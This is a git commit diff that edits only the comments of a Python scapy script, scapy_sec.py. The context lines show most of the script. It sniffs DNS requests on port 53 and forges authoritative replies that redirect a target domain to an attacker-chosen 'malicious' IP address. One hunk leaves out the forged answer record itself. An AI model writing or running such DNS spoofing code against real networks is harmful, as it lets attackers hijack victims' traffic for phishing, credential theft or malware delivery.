d7de423a24eafe97587b08be4e798f3323574442
ashnad17 <127610085+ashnad17@users.noreply.github.com>
2024-11-04 00:28:32 +1100

    Update scapy_sec.py

--- scapy_sec.py
+++ scapy_sec.py
@@ -1,13 +1,12 @@
 from scapy.all import *
 
-# Define target domain and malicious IP
 target_domain = "example.com"
 malicious_ip = "192.168.0.100"
 
-# Function to intercept and spoof DNS responses
+# function that spoofs dns responses
 def spoof_dns(pkt):
     if pkt.haslayer(DNS) and pkt[DNS].qd.qname.decode() == target_domain:
-        # Craft DNS response packet
+        # create dns packet
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
@@ -15,8 +14,7 @@ def spoof_dns(pkt):
         send(spoofed_pkt)
         print(f"Spoofed DNS response sent for {target_domain} to {pkt[IP].src}")
 
-# Sniff DNS requests on port 53
-
+# sniff dns requests on port 53
 if __name__ == "__main__":
     sniff(filter="udp port 53", prn=spoof_dns)
 
